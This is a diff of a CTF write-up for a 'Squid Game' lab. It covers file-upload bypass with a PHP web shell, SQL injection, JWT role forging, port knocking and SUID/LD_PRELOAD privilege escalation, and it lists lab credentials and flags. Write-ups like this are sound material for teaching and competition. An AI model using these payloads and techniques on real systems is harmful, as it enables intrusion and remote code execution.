@@ -12,11 +12,9 @@ tags:
 draft: false
 ---
 
-# Squid Game Engagement Report – 172.16.50.71
+## Summary
 
-## Executive Summary
-
-The engagement targeted a multi-service CTF environment that emulates the "Squid Game" infrastructure. Four main services (ports 8080, 8081, 8082, and 3000) plus auxiliary binaries were assessed. Critical issues were identified in every reachable component: insecure file upload logic, server-side template injection, JWT handling flaws, SQL injection, and weak protection of a native mobile secret. Exploitation yielded full administrative access across the tiers, three distinct flags, and reusable sets of credentials/tokens.
+The engagement targeted a multi-service CTF environment that emulates the "Squid Game" infrastructure. Four main services (ports 8080, 8081, 8082, and 3000) plus auxiliary binaries were assessed. Critical issues were identified in every reachable component: insecure file upload logic, server-side template injection, JWT handling flaws, SQL injection, and weak protection of a native mobile secret. 
 
 ## Attack Surface Overview
 
@@ -29,6 +27,7 @@ The engagement targeted a multi-service CTF environment that emulates the "Squid
 | 25   | SMTP (filtered)                   | Opened only after following the 456→218→067 hint (port knocking) |
 | 8090 | OpsMessaging (filtered)           | Opened only after following the 456→218→067 hint (port knocking) |
 | 22   | OpenSSH 9.6p1                     | Used for privilege escalation                                    |
+
 
 ![Attack Surface Overview](/images/usv_ctf-2025/attack-surface-overview.png)
 
@@ -51,7 +50,8 @@ After finishing the red-light green-light game in the 8080 website, we got a hin
 ![Database Credentials](/images/usv_ctf-2025/port-8080-db-credentials.png)
 
 - **Impact**: Provided database credentials and lateral-awareness enabling later SQL operations.
-- **Flag:**  `flag{fr0ntM4n.b3hind_th3_M45k}`
+
+**Flag 1:**  `flag{fr0ntM4n.b3hind_th3_M45k}`
 
 ### Port 8081 – VIP/Admin File Upload Portal
 
@@ -81,7 +81,7 @@ When we came back to 8081 service, we faced a `Forbidden error` on /, so from he
 - **Vulnerability**: `/upload.php` saves user-supplied files using `generateSquidGameFilename()` → `player{001-456}_game{1-6}_{md5_prefix}.{ext}`. Extension checks only ensure the substring `.png` exists, allowing names such as `shell.png.php`.
 - **Exploit Path**:
   1. Create PHP web shell masquerading as `shell.png.php`.
-     Payload: shell.png.php containing <?php system($_GET['cmd']); ?>.
+     Payload: shell.png.php containing: `<?php system($_GET['cmd']); ?>`.
   2. Upload via authenticated session; server stores as `playerXXX_gameY_<hash>.php`.
   3. Use `bruteforce_upload.py` to discover the randomized filename.
 
@@ -115,7 +115,8 @@ for player in range(1, 457):
   - Confirmed RCE (`ls -la` inside `/var/www/html`).
   - Hidden directory `/prize-only-for-the-worthy-62t1e7t1et7/prize.txt` revealed flag `flag{r3d.l1ght_gr33n.d34th}`.
   - Foothold provided credentials for later services (player456 / `W3_4r3_n0t_h0r53$_W3_4r3_hum4n$_Hum4n$_4r3`).
-- **Flag:** `flag{r3d.l1ght_gr33n.d34th}` 
+
+**Flag 2:** `flag{r3d.l1ght_gr33n.d34th}` 
 
 ### Port 8082 – Blood Cross (React frontend + Spring Boot backend)
 
@@ -128,14 +129,14 @@ After inspecting the website, we found a hint that led us to verify the picture.
    - Re-signed player tokens with `"role": "worker"`.  
      ![JWT Token 1](/images/usv_ctf-2025/port-8082-jwt-token-1.png)
      ![JWT Token 2](/images/usv_ctf-2025/port-8082-jwt-token-2.png)
-   - Worker JWT unlocked `/api/organs`, `/status`, and `/api/flag`.
-
-2. **Flag #3 via Protected Endpoint**  
+   - Worker JWT unlocked `/api/organs`, `/status`, and `/api/flag`. 
    - `/api/flag` immediately returned `flag{$quidG@me_jwT_byp@$$_succ3$$}` when called with forged worker token.
 
-```bash
+  ```bash
      curl -H "Authorization: Bearer <token>" http://172.16.50.71:8082/api/flag
-   ```
+  ```
+  **Flag 3:** `flag{$quidG@me_jwT_byp@$$_succ3$$}`
+
      
 2. **SQL Injection on `/api/organs`**
 	 First thing we tried here was a classical SQLi payload `' OR 1='1 --` which confirmed us, we are on the right path.
@@ -155,6 +156,9 @@ bash -lc 'TOKEN='"'"'FORGE_TOKEN_CHANGE_ME'"'"'; curl -s -H '"'"'Accept: applica
    
    ![SQL Injection Results](/images/usv_ctf-2025/port-8082-sql-injection-results.png)
    - The `messages` table stored `flag{0rg4n$_f0r_$4l3_$qu1d_g4m3_5tyl3}` plus hints (one base64 image pointed to the 456→218→067 knocking sequence).
+
+**Flag 4:** `flag{0rg4n$_f0r_$4l3_$qu1d_g4m3_5tyl3}`
+
 
 ### Port knocking and SMTP filtered -> open
 
@@ -254,8 +258,11 @@ if __name__ == "__main__":
 	
   - `curl -H "Authorization: Bearer bearer_token_admin_access_2024_ctf" http://172.16.50.71:3000/users`
   - Response contained the flag `flag{fr0nt_m4n_s3cr3t_4((355_k3y}` and some other credentials:
-  
+
 ![VIP Messaging API Response](/images/usv_ctf-2025/port-3000-vip-api-response.png)
+
+**Flag 6:** `flag{fr0nt_m4n_s3cr3t_4((355_k3y}`
+
 
 ### boot2root – `/usr/bin/squid`
 
@@ -266,7 +273,7 @@ We search the SUID binaries with ``find / -user root -perm -4000 -type f 2>/dev/
 ![SUID Binary](/images/usv_ctf-2025/squid-suid-binary.png)
 
 We saw the binary needs an argument and it's UPX packed. First step was to unpack using `upx -d ./squid`:
-Our teammate found the key via CHATGPT ([https://chatgpt.com/share/69287a58-4ebc-8000-8520-01e46a178c2b](https://chatgpt.com/share/69287a58-4ebc-8000-8520-01e46a178c2b "https://chatgpt.com/share/69287a58-4ebc-8000-8520-01e46a178c2b")) :   
+Our teammate found the key via CHATGPT :   
 
 ![Squid Binary Analysis](/images/usv_ctf-2025/squid-binary-analysis.png)
 
@@ -291,40 +298,14 @@ Reference: https://medium.com/@hemparekh1596/ld-preload-and-dynamic-library-hija
 ![Privilege Escalation](/images/usv_ctf-2025/squid-privilege-escalation.png)
 
 The VM was broken, after a simple restart everything works. 
-**Flag7**: `flag{Th3_G@m3_Will_N0t_End_unl3ss_Th3_W0rld_Ch@ng3s}`
+
+**Flag 7:** `flag{Th3_G@m3_Will_N0t_End_unl3ss_Th3_W0rld_Ch@ng3s}`
 
 ![Root Shell](/images/usv_ctf-2025/root-shell.png)
 
 NOOOO! WAIT, do you think, we forgot about task 5 ???? 
 N0pe, after reset, flag 5 was in SMTP via MESSAGE command. 
 
+**Flag 5:** `flag{m4sk3d_m4n_c0ntr0l_3ntry}`
+
 AND thats it, WIN 1st place 
-
-![Victory](/images/usv_ctf-2025/victory.png)
-
-## Recommended Remediations
-
-1. **Port 8080**  
-   - Replace insecure template evaluation with a safe templating engine.  
-   - Remove diagnostic endpoints leaking hints/credentials.  
-   - Rotate database passwords exposed within `config.php`.
-
-2. **Port 8081**  
-   - Enforce strict extension validation (e.g., MIME-type sniff, allowlist).  
-   - Store uploads outside document root or disable script execution in `/uploads`.  
-   - Rate-limit and alert on brute-force enumeration of filenames.
-
-3. **Port 8082**  
-   - Generate strong, unique JWT secrets per environment and keep them off user-accessible artifacts.  
-   - Validate JWT roles server-side rather than trusting claims.  
-   - Parameterize SQL queries; sanitize user input.  
-   - Audit POST `/api/organs` for command/data injection.
-
-4. **Port 3000 / Mobile**  
-   - Move bearer token provisioning to a secure backend exchange instead of bundling in the APK / native library.  
-   - Harden native binary against static extraction (e.g., dynamic key derivation, remote attestation).
-
-5. **General**  
-   - Monitor for unauthorized port knocking, SMTP probing, and unexpected dynamic library loads.  
-   - Apply least-privilege principles to Docker containers and secrets.
-
